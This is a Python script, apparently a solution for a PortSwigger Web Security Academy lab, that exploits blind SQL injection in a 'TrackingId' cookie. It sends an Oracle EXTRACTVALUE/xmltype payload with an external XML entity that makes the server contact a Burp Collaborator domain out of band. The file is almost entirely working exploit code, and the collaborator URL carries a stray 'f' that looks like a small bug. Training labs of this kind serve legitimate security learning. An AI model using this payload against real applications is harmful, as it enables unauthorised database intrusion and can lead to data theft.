#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 27/9/2023
#
# Lab: Blind SQL injection with out-of-band interaction
#
# Steps: 1. Inject payload into 'TrackingId' cookie to make a DNS lookup
#           to your burp collaborator domain
#        2. Check your collaborator for incoming traffic
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0a6d0013049e72b387b72abd007e0035.web-security-academy.net"

# change this to your burp collaborator
collaborator = "57alxk13tjhswtogn591zjsep5vwjn7c.oastify.com"

print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "TrackingId")

# payload to make a DNS lookup
payload = f"'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://f{collaborator}/\"> %25remote%3b]>'),'/l') FROM dual)-- -"

# set trackingId cookie
cookies = {
    'TrackingId': payload
}

try:  
    # make DNS lookup with the injected payload
    dns_lookup = requests.get(f"{url}/filter?category=Pets", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

# if the response is OK after making the DNS lookup
if dns_lookup.status_code == 200:
    print(Fore.WHITE + "[*] Injecting payload to make a DNS lookup.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "[#] Check the DNS lookup in your burp collaborator")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload")
